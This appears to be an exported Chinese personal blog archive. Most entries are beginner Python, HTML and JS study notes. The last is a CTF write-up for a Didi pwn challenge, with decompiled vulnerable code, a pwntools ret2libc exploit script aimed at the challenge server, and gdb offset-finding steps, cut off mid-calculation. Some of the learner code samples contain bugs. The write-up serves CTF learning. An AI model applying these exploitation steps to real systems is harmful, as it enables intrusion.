    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>装饰器原来感觉不好理解，这不就是函数嘛，为啥叫装饰器，在知乎上看到的解释还蛮不错的，就是原来有个东西，只有基础的部件，通过添加一些新东西过后，他就变成一个高级的部件</p><p><strong>题目练习：请编写一个 decorator，能在函数调用的前后打印出’begin call’和’end call’的日志</strong></p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call start"</span></span><br><span class="line">        func(*args,**kw)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call end"</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p><strong>思考题：再思考一下能否写出一个@log的decorator，使它既支持：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">又支持：</span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>经过测试，是不可以的，先贴上我的代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text = <span class="string">'execute'</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">        @functools.wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">            func(*args,**kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="comment">#@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"a+b is :&#123;&#125;,&#123;&#125;"</span>.format(a+b,a-b)</span><br><span class="line"></span><br><span class="line">now(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong><big>理由如下：</big></strong></p><p>我以为利用默认参数可以，可报错出现了，显示的是<strong>decorator take exactly 1 arguements(2 given)</strong> 仔细分析一下可以知道@log(‘execute’)是执行完最外层的return了，到了decorator这层，这次就是now = decorator(now),而如果我用@log的话，就是now = log(now),这样明显会出错，无法将函数传到第二层的装饰器部分，即使有默认参数，他也只将now当作你传入的参数，也就是text进行执行，然后这样执行下来的结果就变成decorator(1,2)错误的做法</p><p><strong>练习题：请利用@property 给一个 Screen 对象加上width和height属性，以及一个只读属性 resolution</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line">----</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># test:</span></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line">print(s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = %d ?'</span> % s.resolution</span><br></pre></td></tr></table></figure><ul><li>类这大部分跟c的差别不大，唯一的区别就是可以动态绑定属性和函数</li><li>这道题不难，很简单，就是方法的使用，无技巧性的东西</li><li>贴上我的代码</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._width</span><br><span class="line"><span class="meta">    @width.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._birth = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._height</span><br><span class="line"><span class="meta">    @height.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._height = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolution</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._birth * self._height</span><br><span class="line"></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line"><span class="keyword">print</span> (s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = &#123;&#125;'</span>.format(s.resolution)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a6467bc7/">https://noone-hub.github.io/posts/a6467bc7/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第二天学习</title>
    <url>/posts/18030942/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="回数的练习"><a href="#回数的练习" class="headerlink" title="回数的练习"></a>回数的练习</h2><p>我觉得吧，回数的判断方法用切片解决好，即是利用中点，然后判断两个序列是否相同，相同即为回数，这是最开头的想法，然后发觉切片实现这个有点麻烦，无意在网上查到了，直接从头和尾巴开始判断，这是最简单粗暴的办法，不过效率不高</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_palindrome</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(n) == str(n)[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="排序的练习"><a href="#排序的练习" class="headerlink" title="排序的练习"></a>排序的练习</h2><p>so easy,没什么好说的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L =[(<span class="string">'Bob'</span>, <span class="number">75</span>), (<span class="string">'Adam'</span>, <span class="number">92</span>), (<span class="string">'Bart'</span>, <span class="number">66</span>), (<span class="string">'Lisa'</span>, <span class="number">88</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">by_name</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">by_score</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">L1 = sorted(L,key=by_name)</span><br><span class="line"><span class="keyword">print</span> L1</span><br><span class="line">L2 = sorted(L,key=by_score)</span><br><span class="line"><span class="keyword">print</span> L2</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/18030942/">https://noone-hub.github.io/posts/18030942/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第一天学习</title>
    <url>/posts/5a53500d/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><p>本文只记录对于我感兴趣的部分，为了好复习，只写关键点</p><h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><p>我想的是用循环，迭代的那种方法以及用列表生成式的写法我没想到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triangle</span><span class="params">()</span>:</span></span><br><span class="line">    List = [<span class="number">1</span>] <span class="comment">#初始化第一行</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span>    <span class="comment">#迭代，返回然后从下一行开始</span></span><br><span class="line">        List = List[<span class="number">1</span>] + [List[i] + List[i+<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(List) - <span class="number">1</span> )] + List[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><h2 id="名字规范化"><a href="#名字规范化" class="headerlink" title="名字规范化"></a>名字规范化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> name[:<span class="number">1</span>].upper() + name[<span class="number">1</span>:].lower() <span class="comment">#利用切片巧妙分割</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> capitalize() <span class="comment">#ֱ直接利用python现成函数</span></span><br></pre></td></tr></table></figure><h2 id="str2float"><a href="#str2float" class="headerlink" title="str2float"></a>str2float</h2><p>这个说实话不用map跟reduce更好写，用了反而不会写了，我想到了将数据分为两部分，没想到最后那个除法写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x*<span class="number">10</span> + y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2float</span><span class="params">(s)</span>:</span></span><br><span class="line">    place = s.index(<span class="string">'.'</span>)</span><br><span class="line">    str1 = list(map(int,s[:place]))</span><br><span class="line">    str2 = list(map(int,s[place+<span class="number">1</span>:]))</span><br><span class="line">    <span class="keyword">return</span> reduce(f,str1) + reduce(f,str2)/pow(<span class="number">10</span>,len(str2))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190125204723398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAzMzQ2NjY=,size_16,color_FFFFFF,t_70" alt="intersting"></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/5a53500d/">https://noone-hub.github.io/posts/5a53500d/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>jinja2问题记录</title>
    <url>/posts/ac0d3f82/</url>
    <content><![CDATA[<h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for 循环是一层&#123;&#125;</span><br><span class="line">比如&#123;% for index in group %&#125;</span><br><span class="line">而不是&#123;&#123;% for index in group %&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ac0d3f82/">https://noone-hub.github.io/posts/ac0d3f82/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web， 前端</tag>
      </tags>
  </entry>
  <entry>
    <title>web前端学习之js</title>
    <url>/posts/3c1f8186/</url>
    <content><![CDATA[<h1 id="js学习"><a href="#js学习" class="headerlink" title="js学习"></a>js学习</h1><p>inerHtml跟inerText是不一样的，一个包含标签，一个不包含<br>字符串比较不要用===<br>inerText == 字符串可以<br>其余不行</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/3c1f8186/">https://noone-hub.github.io/posts/3c1f8186/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web,前端</tag>
      </tags>
  </entry>
  <entry>
    <title>前端学习1</title>
    <url>/posts/5a4d96bd/</url>
    <content><![CDATA[<h1 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h1><html><head><meta charset="utf-8"><title>W3Cschool教程(w3cschool.cn)</title></head><body><p><b>这个文本加粗的</b></p><p><strong>这个文本是加粗的</strong></p><p><big>这个文本字体放大</big></p><p><em>这个文本是斜体的</em></p><p><i>这个文本是斜体的</i></p><p><small>这个文本是缩小的</small></p><p>这个文本包含<sub>下标</sub></p><p>这个文本包含<sup>上标</sup></p></body></html><h1 id="pre标签"><a href="#pre标签" class="headerlink" title="pre标签"></a>pre标签</h1><pre>
    此例演示如何使用 pre 标签
    对空行和   空格
    进行控制
</pre><h1 id="html全称"><a href="#html全称" class="headerlink" title="html全称"></a>html全称</h1><p><a>:anchor 定义锚<br><abbr>:abbreviation 定义缩写<br><acronym>: 定义只取消首字母的缩写</acronym></abbr></a></p><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><!DOCTYPE html><address>:定义地址元素<area>:定义图像映射内部的区域 <b>:bold 定义粗体字<base>:定义页面当中的所有链接的基准链接 <bdo>: bidirectional override 定义文字的显示方向 <big>:定义大号字<blockquote>:定义长的引用<body>:定义body元素<br>:break 插入一个回车 <button>:定义按钮<caption>:定义表格标题 <cite>:citation 定义引用 <code>:computer code 定义计算机代码文本<col>:column 定义用于表格列的属性<colgroup>:column group 定义表格的列祖<dd>:definition description 定义定义的描述 <del>:delete 定义被删除的文本<div>:division 定义文档中的节 <dfn>:defining instance 定义定义的项目。<dl>:definition list 定义定义列表<dt>:definition term 定义定义的项目 <em>:emphasized 定义强调文本<fieldset>:定义域结构<form>:定义表单<frame>:定义框架的子窗口<frameset>:定义框架集<h1>to<h6>:定义标题1到标题6<head>:定义关于文档的信息<hr>:horizontal 定义水平线<html>:hypertext markup language 定义html文档 <i>:italic 定义斜体字<iframe>:inline frame 定义内联框架 <img>:image 定义图像 <input>: 定义输入域 <ins>:inserted 定义被插入的文本 <kbd>:keyboard 定义键盘文本<label>:定义针对表单控件的标签<legend>:定义框架集的标题<li>:list item 定义列表的项目<link>:定义资源引用<map>:定义图像映射<meta>:定义元信息<noframe>:定义无框架的节<noscript>:定义无脚本的节<object>:定义内嵌对象<ol>:ordered list 定义有序列表<optgroup>:option group 定义选项组<option>:定义下拉列表的选项<p>:paragraph 定义段落</p><param>:定义对象的参数<pre>:preformatted 定义预格式文本 
<q>:quotation 定义短的引用 
<samp>:sample 定义计算机代码样本 
<script>:定义脚本 
<select>:定义选择列表 
<small>:定义小字体文本 
<span>:定义文档中的节 
<strong>:stronger empasis定义强调文本 
<style>:定义样式的定义 
<sub>:subscript 定义下标文本 
<sup>:superscript 定义上标文本 
<table>:定义表格 
<tbody>:table body 定义表格的主体部分 
<td>:table data cell定义表格单元 
<textarea>:定义文本区域 
<tfoot>:table foot定义表也的脚注 
<th>:table header cell定义表格的表头单元格 
<thead>:table head定义表格的标题 
<title>:定义文档的标题 
<tr>:table row定义表格的行 
<tt>:teletype 定义打字机文本 
<ul>:unordered list 定义无序列表 
<var>:variable 定义变量 


<p>head 头信息<br>title 标题<br>body 正文<br>font 字体<br>br 换行<br>p 段落<br>pre 预格式化<br>hr 水平分界线<br>sup 上标<br>sub 下标<br>b 粗体<br>i 斜体<br>u 下划线<br>em 强调(斜体)<br>strong 强调(粗体)<br>tt 等宽字体(打印机字体)</p>
<ol>
<li></li>
<li></li>
</ol>有序列表
<ul>
<li></li>
<li></li>
</ul>无序列表
<a href=#>超链接
<img src=#>图片链接
th 表头单元
td 表格单元
tr 表格行
table 表格
caption 表格标题
form 交互式表单
input 输入表单控件
option 菜单类控件可选项 select中使用
select 菜单类控件
textarea 多行文本域
style 样式表

<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p><code>计算机输出</code><br><kbd>键盘输入</kbd><br><tt>打字机文本</tt><br><samp>计算机代码样本</samp><br><var>计算机变量</var></p>
<p><strong>本文作者</strong>：NoOne<br /><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/5a4d96bd/">https://noone-hub.github.io/posts/5a4d96bd/</a> <br /><strong>版权声明</strong>：转载请注明出处！</p>
</script></samp></q></pre><p></p></option></optgroup></ol></object></noscript></noframe></map></li></legend></label></kbd></ins></iframe></i></html></head></h6></h1></frameset></form></fieldset></em></dt></dl></dfn></div></del></dd></colgroup></code></cite></caption></button></body></blockquote></big></bdo></b></address><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web,前端,html</tag>
      </tags>
  </entry>
  <entry>
    <title>滴滴CTF之唯一的pwn题详解</title>
    <url>/posts/afd9f177/</url>
    <content><![CDATA[<h1 id="滴滴CTF之唯一的pwn题详解"><a href="#滴滴CTF之唯一的pwn题详解" class="headerlink" title="滴滴CTF之唯一的pwn题详解"></a>滴滴CTF之唯一的pwn题详解</h1><p>前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文:</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Wed Nov 20 2019 23:00:27 GMT+0800 (China Standard Time) --><p><strong>sub_80485DB(stdin, stdout)内部代码</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_804862D()内部代码</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804862D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v0, nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从sub_804862D()这里明显可以看出整数溢出的洞，输入-1即可，-1在32位机器上为0xffffffff,具体可以自行调试查看，转化为signed int为-1，小于63，接下来在read(v1, &amp;buf, nbytes);就可以输入很长的一串字符，看上去好像很简单对吧，整数溢出，然后接着栈溢出，ROP一波梭。。。我觉得是这样的，可是运行自己的exp起来后，发觉有很大的问题，每次都是出错<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g27zjxto4tj30m90g5adg.jpg" alt="1"><br>具体调试，你可以从</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#payload = 'a'*0x44 + p32(ecx) + p32(0)*6 + p32(system_addr) + p32(0) + p32(bin_sh)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    Passwd(<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul><li>在具体地方附加，用gdb.attach(io)附加，然后finish 3次出到最外层，最外层的地址就是0x80开头的这种，然后单步运行，你会发觉最后出错的地方在read这里，然后read函数出错，这里我当时不知道怎么继续调试下去了，一直卡死在这，还有个小问题，我发觉第一次printf会输出一些乱码，按照往常来说，这里肯定泄露了信息，所以具体这里泄露了什么信息，就得你自己去发现了。<br>后面从大佬的wp里发觉，他说ecx不能改，然后我就去看汇编代码了，</li></ul><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285j7w0nhj30iz0evdh0.jpg" alt="2"></p><ul><li>发觉最后一行有点道道，你看我上一张图的错误，0x6161615d,为什么不是0x61616161呢，ecx-4,联系起来没有，刚好0x61616161-0x6161615d = 4 ,也就是说，我把ecx覆盖成错误的值了，所以就没法正确读入了，那我如何找到ecx的正确位置呢,这时候就运用gdb了<br>我直接将Passwd(‘a’*0x60)这句注释掉，然后python运行这个脚本，然后用<br>gdb-peda$ pattern_create 200<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zdxr09j30m70f0tb5.jpg" alt="10"><br>创建一串字符，然后复制，然后<br>gdb-peda$ c<br>在打开的另一个终端里输入这串字符<br>然后获得这张图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zjk9y0j30md0c6dhf.jpg" alt="11"><br>Program received signal SIGSEGV (fault address 0x4141333d)<br>有这句话<br>然后复制这个address<br>0x4141333d,在将他+4，为什么要加4呢，因为我们刚刚那里ecx-了个4<br>所以变成0x41413341<br>gdb-peda$ pattern_offset 0x41413341<br>获得偏移，1094792001 found at offset: 68</li></ul><h2 id="定点泄露"><a href="#定点泄露" class="headerlink" title="定点泄露"></a>定点泄露</h2><p>68个偏移，好了，知道错误在哪了，如何泄露ecx？关键点来了，还记得刚开始的printf输出的乱码吗，这里肯定有泄露信息，从ida里我看不出什么东西，所以，gdb也调试一波了</p><p>你可以直接gdb filename 或者 gdb 启动后在file加载都行，</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285op2bscj30m70f9n1g.jpg" alt="3"></p><p>然后输入start开始，这时候你们的界面可能跟我不太一样，因为我装了插件，peda和pwndbg</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285sjp1qej31bd0qb13z.jpg" alt="4"></p><p>单步输入n 走到push ecx这里，因为我需要的是ecx，和ebp,为什么需要ebp呢，因为知道ebp我在知道偏移，整个栈的位置都知道了，所以我需要把这里的数据记录下来，可以看到，寄存器里存的值</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg" alt="12"></p><p>ecx 0xffffd160<br>ebp 0xffffd148<br>然后我需要继续运行软件，到我应该栈溢出的地方，这时候先下个断，<br>gdb$ b read<br>在read函数处下断，然后再<br>gdb$ c</p><p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287we3ahoj30m80ekte2.jpg" alt="5"></p><p>这时候会在read函数处断下，不担心，输入finish<br>gdb$ finish<br>然后让你输入名字，直接回车，这时候继续单步，单步就是输入n(next)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wmw6ocj30vs0ok47n.jpg" alt="13"></p><p>在fprintf这里停下，看地址，取出0xffffd090<br>然后<br>gdb$ x/20wx 0xffffd090<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wt79m9j30kz03vaac.jpg" alt="14"></p><p>好了，我看到关键点了，0xffffd148,在第三行第三列里，也就是ebp的值，也就是说，我们需要输入10个4字节就可以到这个地方，还有，你看ebp后面的地址，0xf7e2c935，这里是不是很像libc函数的地址，这里我为什么说像呢，从上面我看寄存器那张图里可以看到__libc_start_main+241的地址，他就是这个类型的。</p><p>所以，我输出一下这里的地址看看内容</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/wx 0xf7e2c935</span><br><span class="line">0xf7e2c935 &lt;setbuf+21&gt;:	0xc31cc483</span><br></pre></td></tr></table></figure><p>果真如此，setbuf的地址我们也拿到了，一次性泄露了ebp和setbuf+21的地址，所以这时候怎么获得ecx的值呢，这里你就想每次栈的相对位置会变吗，不会的，所以，开局ebp和ecx的地址相差也不会变，所以我就用ebp和ecx的偏差<br>ecx 0xffffd160<br>ebp 0xffffd148<br>ecx - ebp = 